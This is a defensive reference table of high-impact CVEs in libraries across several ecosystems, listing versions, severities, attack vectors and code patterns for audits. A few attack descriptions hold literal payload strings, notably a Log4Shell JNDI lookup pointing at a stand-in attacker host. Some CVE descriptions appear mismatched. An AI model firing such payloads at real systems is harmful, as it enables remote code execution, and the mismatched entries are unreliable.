# Known CVEs Reference

Comprehensive reference of high-impact CVEs across programming ecosystems. Use this for manual cross-referencing when ecosystem-specific audit tools are unavailable.

---

## Node.js Ecosystem

### jsonwebtoken

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-23529 | < 9.0.0 | 9.0.0 | High | 7.6 | Insecure key retrieval via `secretOrPublicKey` allows arbitrary code execution when attacker controls the key argument |
| CVE-2022-23539 | < 9.0.0 | 9.0.0 | Medium | 5.9 | Allows use of insecure key types for signature verification, enabling algorithm confusion attacks |
| CVE-2022-23540 | < 9.0.0 | 9.0.0 | High | 7.6 | Lack of algorithm enforcement in `jwt.verify()` permits signature bypass via `none` algorithm |
| CVE-2022-23541 | < 9.0.0 | 9.0.0 | Medium | 5.9 | Key type confusion between PEM and HMAC allows forged tokens when using public key as HMAC secret |

**Detection pattern:** Search for `require('jsonwebtoken')` or `import jwt from 'jsonwebtoken'`. Check if `algorithms` option is explicitly set in `jwt.verify()`.

### serialize-javascript

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2020-7660 | < 3.1.0 | 3.1.0 | Critical | 9.8 | Arbitrary code execution when deserializing crafted regex or function payloads via `eval()` |

**Detection pattern:** Search for `require('serialize-javascript')`. Check if output is used with `eval()` or injected into HTML without sanitization.

### lodash

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2021-23337 | < 4.17.21 | 4.17.21 | High | 7.2 | Command injection via `template()` function when template string is user-controlled |
| CVE-2020-28500 | < 4.17.21 | 4.17.21 | Medium | 5.3 | ReDoS in `toNumber()`, `trim()`, `trimEnd()` via crafted input strings |
| CVE-2020-8203 | < 4.17.19 | 4.17.19 | High | 7.4 | Prototype pollution via `zipObjectDeep()`, `set()`, `setWith()` with crafted property paths |
| CVE-2019-10744 | < 4.17.12 | 4.17.12 | Critical | 9.1 | Prototype pollution via `defaultsDeep()` allows property injection on `Object.prototype` |

**Detection pattern:** Search for `require('lodash')` or `import _ from 'lodash'`. Check for usage of `_.template()`, `_.set()`, `_.defaultsDeep()` with user input.

### node-fetch

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-0235 | < 2.6.7, 3.x < 3.1.1 | 2.6.7, 3.1.1 | Medium | 6.1 | Exposure of sensitive headers (Authorization, Cookie) during cross-origin redirect |

**Detection pattern:** Search for `require('node-fetch')` or `import fetch from 'node-fetch'`. Check if Authorization headers are set and redirects are followed to external domains.

### xml2js

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-0842 | < 0.5.0 | 0.5.0 | Medium | 5.3 | Prototype pollution via `__proto__` keys in parsed XML documents |

**Detection pattern:** Search for `require('xml2js')`. Check if XML input comes from untrusted sources.

### express

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-29041 | < 4.19.2 | 4.19.2 | Medium | 6.1 | Open redirect via malformed URL in `res.redirect()` |
| CVE-2022-24999 | < 4.17.3 | 4.17.3 | High | 7.5 | Prototype pollution via `qs` dependency in query string parsing |
| CVE-2024-43796 | < 4.20.0 | 4.20.0 | Medium | 5.0 | XSS via `res.redirect()` when user input is reflected in the redirect URL |

**Detection pattern:** Search for `require('express')`. Check `res.redirect()` calls with user-controlled URLs.

### axios

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-45857 | < 1.6.0 | 1.6.0 | Medium | 6.5 | CSRF token leakage via `X-XSRF-TOKEN` header sent to cross-origin requests |
| CVE-2023-26159 | < 1.6.3 | 1.6.3 | Medium | 6.1 | SSRF via protocol-relative URL bypass allowing requests to unintended hosts |

**Detection pattern:** Search for `require('axios')` or `import axios`. Check if user-controlled URLs are passed to `axios.get()`, `axios.post()`, etc.

### minimist

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2021-44906 | < 1.2.6 | 1.2.6 | Critical | 9.8 | Prototype pollution via crafted CLI arguments (`--__proto__.polluted=true`) |
| CVE-2020-7598 | < 1.2.3 | 1.2.3 | Medium | 5.6 | Prototype pollution via constructor property |

**Detection pattern:** Search for `require('minimist')`. Often a transitive dependency — check `npm ls minimist`.

### yargs-parser

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2020-7608 | < 13.1.2, 14.x < 15.0.1, 18.x < 18.1.1 | 13.1.2, 15.0.1, 18.1.1 | Medium | 5.3 | Prototype pollution via crafted arguments |

**Detection pattern:** Search for `require('yargs-parser')` or as transitive dependency of `yargs`.

### node-forge

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-24771 | < 1.3.0 | 1.3.0 | High | 7.5 | RSA PKCS#1 v1.5 signature verification bypass via crafted signature |
| CVE-2022-24772 | < 1.3.0 | 1.3.0 | High | 7.5 | RSA PKCS#1 v1.5 signature verification accepts signatures with modified DigestInfo |
| CVE-2022-0122 | < 1.0.0 | 1.0.0 | Medium | 6.1 | Open redirect in `forge.util.getPath()` |

**Detection pattern:** Search for `require('node-forge')`. Check if RSA signature verification is performed.

### tar (node-tar)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2021-37701 | < 6.1.9 | 6.1.9 | High | 8.6 | Arbitrary file overwrite via symlink following (Zip Slip variant) |
| CVE-2021-37712 | < 6.1.9 | 6.1.9 | High | 8.6 | Arbitrary file creation/overwrite via crafted tar with directory-like entries |
| CVE-2021-32803 | < 6.1.2 | 6.1.2 | High | 8.1 | Arbitrary file overwrite via insufficient symlink protection |

**Detection pattern:** Search for `require('tar')`. Check if extracting archives from untrusted sources.

### semver

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-25883 | < 5.7.2, 6.x < 6.3.1, 7.x < 7.5.2 | 5.7.2, 6.3.1, 7.5.2 | High | 7.5 | ReDoS via crafted version strings, causing CPU exhaustion |

**Detection pattern:** Often a transitive dependency. Check if user-supplied version strings are parsed.

### shell-quote

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2021-42740 | < 1.7.3 | 1.7.3 | Critical | 9.8 | Command injection via improperly escaped shell metacharacters |

**Detection pattern:** Search for `require('shell-quote')`. Check if user input flows into `quote()` or `parse()`.

---

## Python Ecosystem

### PyYAML

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2020-14343 | < 5.4 | 5.4 | Critical | 9.8 | Arbitrary code execution via `yaml.load()` without `Loader=SafeLoader` — constructs arbitrary Python objects |
| CVE-2020-1747 | < 5.3.1 | 5.3.1 | Critical | 9.8 | Arbitrary code execution via `yaml.full_load()` — incomplete fix for unsafe deserialization |
| CVE-2017-18342 | < 4.1 | 4.1 | Critical | 9.8 | Arbitrary command execution via `yaml.load()` with crafted YAML |

**Detection pattern:** Search for `yaml.load(` without `Loader=SafeLoader` or `Loader=yaml.SafeLoader`. Also check for `yaml.unsafe_load(` and `yaml.full_load(`.

### Pillow (PIL)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-44271 | < 10.0.1 | 10.0.1 | High | 7.5 | DoS via uncontrolled resource consumption processing large images |
| CVE-2023-50447 | < 10.2.0 | 10.2.0 | Critical | 9.8 | Arbitrary code execution via crafted image if `ImageMath.eval()` is used |
| CVE-2022-22817 | < 9.0.1 | 9.0.1 | Critical | 9.8 | Arbitrary code execution via `PIL.ImageMath.eval()` with crafted expression |
| CVE-2021-25287 | < 8.2.0 | 8.2.0 | Critical | 9.1 | Out-of-bounds read via crafted JPEG2000 image |

**Detection pattern:** Search for `from PIL import` or `import PIL`. Check if processing untrusted images. Critical if `ImageMath.eval()` is used.

### requests

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-32681 | < 2.31.0 | 2.31.0 | Medium | 6.1 | Leakage of `Proxy-Authorization` header to destination server during HTTPS redirects |
| CVE-2024-35195 | < 2.32.0 | 2.32.0 | Medium | 5.6 | `verify=False` on first request persists across all subsequent requests in session |

**Detection pattern:** Search for `import requests`. Check for `requests.Session()` with sensitive headers and redirect following.

### Django

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-24680 | < 3.2.24, 4.x < 4.2.10, 5.x < 5.0.2 | 3.2.24, 4.2.10, 5.0.2 | High | 7.5 | DoS via `intcomma` template filter with very long strings |
| CVE-2023-46695 | < 3.2.23, 4.x < 4.1.13, 4.2.x < 4.2.7 | 3.2.23, 4.1.13, 4.2.7 | High | 7.5 | DoS via `UsernameField` on Windows with NFKC normalization |
| CVE-2023-36053 | < 3.2.20, 4.x < 4.1.10, 4.2.x < 4.2.3 | 3.2.20, 4.1.10, 4.2.3 | High | 7.5 | ReDoS via `EmailValidator` and `URLValidator` |
| CVE-2023-23969 | < 3.2.17, 4.x < 4.0.9, 4.1.x < 4.1.6 | 3.2.17, 4.0.9, 4.1.6 | High | 7.5 | DoS via `Accept-Language` header |
| CVE-2021-44420 | < 2.2.25, 3.x < 3.1.14, 3.2.x < 3.2.10 | 2.2.25, 3.1.14, 3.2.10 | High | 7.3 | Potential auth bypass in path resolution |

**Detection pattern:** Check `django` in `requirements.txt` or `INSTALLED_APPS` in settings. Compare version against known vulnerable ranges.

### Flask / Werkzeug

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-25577 | Werkzeug < 2.2.3 | 2.2.3 | High | 7.5 | DoS via crafted multipart form data causing excessive memory usage |
| CVE-2023-23934 | Werkzeug < 2.2.3 | 2.2.3 | Low | 3.5 | Cookie injection via `=` in cookie name on localhost |

**Detection pattern:** Search for `from flask import` or `from werkzeug import`. Check Werkzeug version (Flask dependency).

### Jinja2

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-22195 | < 3.1.3 | 3.1.3 | Medium | 6.1 | XSS via `xmlattr` filter when rendering untrusted attribute values |
| CVE-2024-34064 | < 3.1.4 | 3.1.4 | Medium | 5.4 | XSS via `xmlattr` filter accepting keys with spaces |

**Detection pattern:** Search for `from jinja2 import` or Jinja template files. Check if `xmlattr` filter is used with user-controlled data.

### paramiko

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-48795 | < 3.4.0 | 3.4.0 | Medium | 5.9 | Terrapin attack: prefix truncation in SSH handshake (affects SSH protocol implementation) |

**Detection pattern:** Search for `import paramiko`. Any SSH connections are affected.

### cryptography

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-26130 | < 42.0.4 | 42.0.4 | High | 7.5 | NULL pointer dereference via PKCS#12 key/cert deserialization on specific platforms |
| CVE-2023-49083 | < 41.0.6 | 41.0.6 | High | 7.5 | DoS via NULL pointer dereference when loading malformed PKCS#7 certificates |
| CVE-2023-38325 | < 41.0.2 | 41.0.2 | High | 7.5 | Mishandling of SSH certificates leading to identity verification bypass |

**Detection pattern:** Search for `from cryptography import` or `import cryptography`. Critical if loading certificates or PKCS data from untrusted sources.

### setuptools

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-6345 | < 70.0.0 | 70.0.0 | High | 8.8 | Remote code execution via crafted URL in `package_index` module |

**Detection pattern:** Check setuptools version in environment. Vulnerable if downloading packages from untrusted sources.

### Unsafe Deserialization Pattern (not CVE-assigned)

Not a specific CVE but a critical code pattern. Python `pickle`, `shelve`, `marshal`, and `yaml.load()` can all execute arbitrary code when deserializing untrusted data.

**Detection pattern:** Search for `pickle.loads(`, `pickle.load(`, `shelve.open(`, `marshal.loads(`, `yaml.load(` without SafeLoader.

---

## Java Ecosystem

### Log4j (Log4Shell)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2021-44228 | 2.0-beta9 to 2.14.1 | 2.15.0 | Critical | 10.0 | RCE via JNDI lookup in log messages — `${jndi:ldap://attacker.com/a}` triggers remote class loading |
| CVE-2021-45046 | 2.0-beta9 to 2.15.0 | 2.16.0 | Critical | 9.0 | Bypass of CVE-2021-44228 fix — JNDI injection still possible in non-default configurations |
| CVE-2021-45105 | 2.0-beta9 to 2.16.0 | 2.17.0 | High | 7.5 | DoS via infinite recursion in lookup evaluation |
| CVE-2021-44832 | 2.0-beta7 to 2.17.0 | 2.17.1 | Medium | 6.6 | RCE via JDBC Appender when attacker controls configuration |

**Detection pattern:** Search for `log4j-core` in `pom.xml` or `build.gradle`. Check version. Also search for `org.apache.logging.log4j` imports. Versions 1.x are also EOL with separate vulnerabilities.

### Spring Framework (Spring4Shell)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-22965 | Spring Framework 5.3.0 to 5.3.17, 5.2.0 to 5.2.19 | 5.3.18, 5.2.20 | Critical | 9.8 | RCE via data binding on JDK 9+ when using Spring MVC with Tomcat WAR deployment |
| CVE-2022-22963 | Spring Cloud Function < 3.1.7, < 3.2.3 | 3.1.7, 3.2.3 | Critical | 9.8 | RCE via SpEL injection in routing expressions |
| CVE-2024-22234 | Spring Security 6.1.0 to 6.1.6, 6.2.0 to 6.2.1 | 6.1.7, 6.2.2 | High | 7.4 | Authentication bypass when `AuthenticationTrustResolver.isFullyAuthenticated(null)` returns true |

**Detection pattern:** Search for `spring-webmvc`, `spring-boot-starter-web` in `pom.xml` or `build.gradle`. Check Spring Framework version.

### Jackson-databind

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2020-36518 | < 2.12.6.1, < 2.13.2.1 | 2.12.6.1, 2.13.2.1 | High | 7.5 | DoS via deeply nested JSON causing stack overflow |
| CVE-2019-14540 | < 2.9.10 | 2.9.10 | Critical | 9.8 | Deserialization gadget chain via `HikariConfig` class |
| CVE-2019-16335 | < 2.9.10 | 2.9.10 | Critical | 9.8 | Deserialization gadget chain via `com.zaxxer.hikari` classes |

**Detection pattern:** Search for `jackson-databind` in `pom.xml` or `build.gradle`. Check if `enableDefaultTyping()` or `@JsonTypeInfo` with `Id.CLASS`/`Id.MINIMAL_CLASS` is used (increases risk).

### Apache Struts

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2017-5638 | 2.3.x < 2.3.32, 2.5.x < 2.5.10.1 | 2.3.32, 2.5.10.1 | Critical | 10.0 | RCE via crafted `Content-Type` header in multipart request (Equifax breach) |
| CVE-2023-50164 | 2.x < 2.5.33, 6.x < 6.3.0.2 | 2.5.33, 6.3.0.2 | Critical | 9.8 | RCE via file upload path traversal |

**Detection pattern:** Search for `struts2-core` or `struts-core` in `pom.xml`.

### Fastjson (Alibaba)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-25845 | < 1.2.83 | 1.2.83 | Critical | 9.8 | Deserialization RCE via `autoType` bypass — crafted JSON triggers arbitrary class instantiation |

**Detection pattern:** Search for `com.alibaba:fastjson` in `pom.xml` or `build.gradle`. Any usage with `autoType` enabled is high risk.

### SnakeYAML

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-1471 | < 2.0 | 2.0 | Critical | 9.8 | RCE via `Constructor` class — `yaml.load()` invokes arbitrary constructors |
| CVE-2022-41854 | < 1.32 | 1.32 | Medium | 6.5 | DoS via stack overflow on deeply nested input |

**Detection pattern:** Search for `org.yaml:snakeyaml` in `pom.xml`. Check if `Yaml(new SafeConstructor())` is used (safe) vs `new Yaml()` (unsafe).

### Apache Commons Text

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-42889 | 1.5 to 1.9 | 1.10.0 | Critical | 9.8 | RCE via `StringSubstitutor` interpolation — `${script:js:...}`, `${dns:...}`, `${url:...}` execute arbitrary code |

**Detection pattern:** Search for `commons-text` in `pom.xml`. Check if `StringSubstitutor` is used with untrusted input.

---

## Ruby Ecosystem

### Rails (Action Pack / Active Record)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-26143 | 7.0.x < 7.0.8.1, 7.1.x < 7.1.3.1 | 7.0.8.1, 7.1.3.1 | Medium | 6.1 | XSS via `content_security_policy` nonce in `<meta>` tag |
| CVE-2023-22795 | < 6.1.7.1, < 7.0.4.1 | 6.1.7.1, 7.0.4.1 | High | 7.5 | ReDoS via MIME type parsing in Action Dispatch |
| CVE-2023-22794 | < 6.1.7.1, < 7.0.4.1 | 6.1.7.1, 7.0.4.1 | High | 8.8 | SQL injection via Active Record comments |
| CVE-2022-32224 | < 6.0.5.1, < 6.1.6.1, < 7.0.3.1 | 6.0.5.1, 6.1.6.1, 7.0.3.1 | Critical | 9.8 | Deserialization RCE via Active Record `serialize` with YAML |

**Detection pattern:** Check `Gemfile` for `rails` gem version. Broad attack surface; check all Active Record and Action Pack components.

### Rack

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-26146 | < 2.2.8.1, 3.0.x < 3.0.9.1 | 2.2.8.1, 3.0.9.1 | Medium | 5.3 | ReDoS via crafted `Accept-Encoding` header |
| CVE-2024-25126 | < 2.2.8.1, 3.0.x < 3.0.9.1 | 2.2.8.1, 3.0.9.1 | Medium | 5.3 | ReDoS via crafted `Content-Type` header |
| CVE-2023-27539 | < 2.2.6.4, 3.0.x < 3.0.7 | 2.2.6.4, 3.0.7 | Medium | 5.3 | ReDoS in header parsing |

**Detection pattern:** Check `Gemfile.lock` for `rack` version. Present in virtually all Ruby web applications.

### Nokogiri

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-24839 | < 1.13.4 | 1.13.4 | High | 7.5 | DoS via crafted HTML/XML input in NekoHTML parser |
| CVE-2022-29181 | < 1.13.6 | 1.13.6 | High | 8.2 | XXE and SSRF via crafted XML when using `DTDLOAD` or `DTDVALID` |

**Detection pattern:** Search for `require 'nokogiri'` or `gem 'nokogiri'` in `Gemfile`. Check if parsing untrusted XML.

---

## Go Ecosystem

### golang.org/x/text

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-32149 | < 0.3.8 | 0.3.8 | High | 7.5 | DoS via crafted `Accept-Language` header causing excessive CPU usage in `language.Parse()` |
| CVE-2021-38561 | < 0.3.7 | 0.3.7 | High | 7.5 | Out-of-bounds read via crafted input to `language.ParseAcceptLanguage()` |

**Detection pattern:** Check `go.mod` for `golang.org/x/text`. Used indirectly by many Go packages.

### net/http (stdlib)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-44487 | Go < 1.21.3, < 1.20.10 | 1.21.3, 1.20.10 | High | 7.5 | HTTP/2 Rapid Reset DDoS — attacker opens and immediately cancels streams, exhausting server resources |
| CVE-2023-39326 | Go < 1.21.5, < 1.20.12 | 1.21.5, 1.20.12 | Medium | 5.3 | HTTP chunked encoding can cause excessive memory allocation |
| CVE-2023-29406 | Go < 1.20.6, < 1.19.11 | 1.20.6, 1.19.11 | Medium | 6.5 | Host header injection via `Request.Host` with invalid characters |

**Detection pattern:** Check Go version in `go.mod`. Affects any Go HTTP server.

### golang.org/x/crypto

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-48795 | < 0.17.0 | 0.17.0 | Medium | 5.9 | Terrapin attack on SSH — prefix truncation allowing handshake manipulation |

**Detection pattern:** Check `go.mod` for `golang.org/x/crypto`. Any SSH usage is affected.

### golang.org/x/net

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-44487 | < 0.17.0 | 0.17.0 | High | 7.5 | HTTP/2 Rapid Reset — same as stdlib issue, affects `golang.org/x/net/http2` |
| CVE-2023-3978 | < 0.13.0 | 0.13.0 | Medium | 6.1 | XSS via `html/template` rendering of crafted HTML |

**Detection pattern:** Check `go.mod` for `golang.org/x/net`.

---

## PHP Ecosystem

### Laravel

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-29291 | < 11.0 | 11.0 | Critical | 9.8 | Deserialization RCE via crafted serialized payload in queue workers |
| CVE-2021-43617 | < 8.6.12 | 8.6.12 | Critical | 9.8 | Auth bypass via case-insensitive email validation in `RegisterController` |
| CVE-2021-21263 | < 6.20.14, < 7.30.4, < 8.22.1 | 6.20.14, 7.30.4, 8.22.1 | High | 7.2 | SQL injection via request validation when `distinct` rule is used |

**Detection pattern:** Check `composer.json` for `laravel/framework` version.

### Symfony

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-24569 | < 6.3.12, < 7.0.2 | 6.3.12, 7.0.2 | High | 8.8 | RCE via crafted `_fragment` route when `framework.fragments` is enabled |
| CVE-2023-46734 | < 4.4.51, < 5.4.31, < 6.3.8 | 4.4.51, 5.4.31, 6.3.8 | Medium | 6.1 | XSS in Twig integration via `CodeExtension` filters |
| CVE-2023-46733 | < 4.4.51, < 5.4.31, < 6.3.8 | 4.4.51, 5.4.31, 6.3.8 | High | 8.8 | Session fixation via `migrate()` not always regenerating session ID |

**Detection pattern:** Check `composer.json` for `symfony/symfony` or individual `symfony/*` packages.

### Guzzle

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-31090 | < 7.4.5 | 7.4.5 | High | 7.7 | `Authorization` header leakage during cross-domain redirects |
| CVE-2022-31091 | < 7.4.5, < 6.5.8 | 7.4.5, 6.5.8 | High | 7.7 | Cookie forwarding to non-matching domains during redirect |

**Detection pattern:** Check `composer.json` for `guzzlehttp/guzzle`.

---

## Rust Ecosystem

### hyper

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2023-26964 | < 0.14.19 | 0.14.19 | High | 7.5 | HTTP/2 peer can cause excessive CPU usage via CONTINUATION frames |

**Detection pattern:** Check `Cargo.toml` for `hyper` dependency.

### regex (Rust)

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2022-24713 | < 1.5.5 | 1.5.5 | High | 7.5 | ReDoS via crafted regex pattern causing exponential time |

**Detection pattern:** Check `Cargo.toml` for `regex` dependency. Critical if regex patterns include user input.

---

## .NET Ecosystem

### System.Text.Json

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-30105 | .NET 8 < 8.0.7 | 8.0.7 | High | 7.5 | DoS via crafted JSON payload causing stack overflow during deserialization |

### Microsoft.Data.SqlClient

| CVE | Affected Versions | Fixed Version | Severity | CVSS | Attack Vector |
|-----|-------------------|---------------|----------|------|---------------|
| CVE-2024-0056 | < 2.1.7, 3.x < 3.1.5, 4.x < 4.0.5, 5.x < 5.1.4 | 2.1.7, 3.1.5, 4.0.5, 5.1.4 | High | 8.7 | Man-in-the-middle via TLS downgrade in database connections |

**Detection pattern:** Check `*.csproj` for `Microsoft.Data.SqlClient` package reference.

---

## Cross-Ecosystem Vulnerability Patterns

### Prototype Pollution (JavaScript)
Any package that merges objects deeply without checking for `__proto__`, `constructor`, or `prototype` keys is potentially vulnerable. Common in utility libraries (lodash, merge-deep, defaults-deep, etc.).

### Mass Assignment (Ruby, Python, PHP)
Frameworks that auto-bind request parameters to model attributes. Rails `strong_parameters`, Django `ModelForm.fields`, Laravel `$fillable`/`$guarded`.

### Deserialization (Java, PHP, Python, Ruby, .NET)
Any library that deserializes untrusted data into objects. Includes Java `ObjectInputStream`, PHP `unserialize()`, Python `pickle`, Ruby `Marshal.load()`, .NET `BinaryFormatter`.

### XML External Entity (XXE) — All ecosystems
Any XML parser configured to resolve external entities by default. Affects libxml2 (Ruby/Python/PHP), Java SAX/DOM parsers, .NET `XmlDocument`.

### XML Bomb / Billion Laughs — All ecosystems
Any XML parser that allows entity expansion without limits. Most parsers now have limits by default, but older versions may not.

### ReDoS — All ecosystems
Regular expressions with nested quantifiers (`(a+)+$`) or overlapping alternation. Found in email validators, URL parsers, MIME type handlers.

### SSRF — All ecosystems
Any HTTP client that follows redirects or allows user-controlled URLs. Check for URL validation and allowlisting of destinations.
